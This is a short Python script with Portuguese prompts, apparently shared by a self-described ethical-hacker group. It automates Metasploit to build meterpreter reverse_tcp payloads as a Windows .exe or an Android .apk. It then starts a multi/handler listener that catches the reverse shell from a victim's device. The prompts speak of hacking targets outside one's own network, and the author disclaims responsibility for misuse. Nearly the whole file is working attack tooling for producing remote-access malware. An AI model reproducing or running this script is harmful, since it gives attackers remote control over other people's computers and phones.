#!/usr/bin/python3

import os
import time

""" É apenas um "programa" simples para facilitar a vida de que está de saco cheio
de digitar lport,lhost,set payload,etc...
Espero que ajude vocês ;)

"""

"""Eu não me responsabilizo pelas merdas que vocês fazem"""


author = "Ítalo [0l4t1]"




R =  '\033[0;0m' 	# Voltar a cor normal
V = '\033[31m' 		# Vermelho


os.system("clear")








def banner():

	print ("""************************************************************
############################################################
                                        
         https://www.facebook.com/AhcorOlati                   
        https://www.facebook.com/hackerseticosbrasil          
===========================================================
               Desfrute do seu conhecimento  
************************************************************
            ▁ ▂ ▄ ▅ ▆ ▇ █ 0ℓ4ţ1 █ ▇ ▆ ▅ ▄ ▂ ▁                 
************************************************************""")


banner()


def windows():
	ip = input ("[+]Coloque o seu IP (Caso for hackear fora da sua rede,coloque o IP EXTERNO) : ")
	porta = input ("[+]Coloque a Porta : ")
	nome = input ("[+]Coloque o nome do Payload : ")
	
	pay_windows = "msfpayload windows/meterpreter/reverse_tcp lhost=%s lport=%s x > /root/Desktop/%s.exe"%(ip, porta,nome)
	os.system("clear")
	print ("Criando Payload\nIP:%s\nPorta:%s\nNome:%s"%(ip, porta,nome))	
	os.system(pay_windows)
	os.system("clear")
	print ("Salvo em /root/Desktop")
	input("Pressione [ENTER] para continuar")	

	os.system("clear")

	listen = input("Deseja executar o listen agora ? [S/N] : ")
	if listen == "s" or listen == "S" : 
		print ("Criando Listen..")
		msfcli = "msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=%s lport=%s E"%(ip, porta)
		os.system(msfcli)
	elif listen == "n" or listen == "N": 
	
		print (V+"Saindo..."+R)
		time.sleep(2)
		os.system("clear")
		os.system("exit")		





def android():
	ip = input ("[+]Coloque o seu IP (Caso for hackear fora da sua rede,coloque o IP EXTERNO): ")
	porta = input ("[+]Coloque a Porta : ")
	nome = input ("[+]Coloque o nome do Payload : ")	
	
	pay_android = "msfpayload android/meterpreter/reverse_tcp lhost=%s lport=%s x > /root/Desktop/%s.apk"%(ip, porta,nome)
	print (V+"[!]"+R,"Criando Payload...")	
	os.system(pay_android)
	os.system("clear")
	print ("Salvo em /root/Desktop")
	input("Pressione [ENTER] para continuar")	
	os.system("clear")	
	listen = input("Deseja executar o listen agora ? [S/N] : ")
	if listen == "s" or listen == "S": 
		print ("Criando Listen..")
		msfcli = "msfcli multi/handler payload=android/meterpreter/reverse_tcp lhost=%s lport=%s E"%(ip, porta)
		os.system(msfcli)	
	elif listen == "n" or listen == "N": 
	
		print (V+"Saindo..."+R)
		time.sleep(2)
		os.system("clear")
		os.system("exit")	




	
def sair():
	certeza = input("Tem certeza que seseja sair ? [S/N] : ")
	if certeza == "s" or certeza == "S" :
		print (V+"Saindo..."+R)
		time.sleep(2)
		os.system("clear")
		os.system("exit")
	elif certeza == "n" or certeza == "N" :
		print (V+"Saindo mesmo assim"+R)
		time.sleep(1)		
		print (V+"HUE"*100+R)
		time.sleep(1)		
		os.system("clear")
		os.system("exit")





opcoes = {
    "1": windows,
    "2": android,
    "3": sair,	    
}

print ("1 = Payload para Windows 7/xp - 32 bits \n2 = Payload para Android << 4.1\n3 = Sair")


escolha = input("Escolha uma opção : ")


try:
    resultado = opcoes[escolha]
except KeyError:
    print (V+"Escolha inesistente !!!"+R)


else:
	     
	resultado()


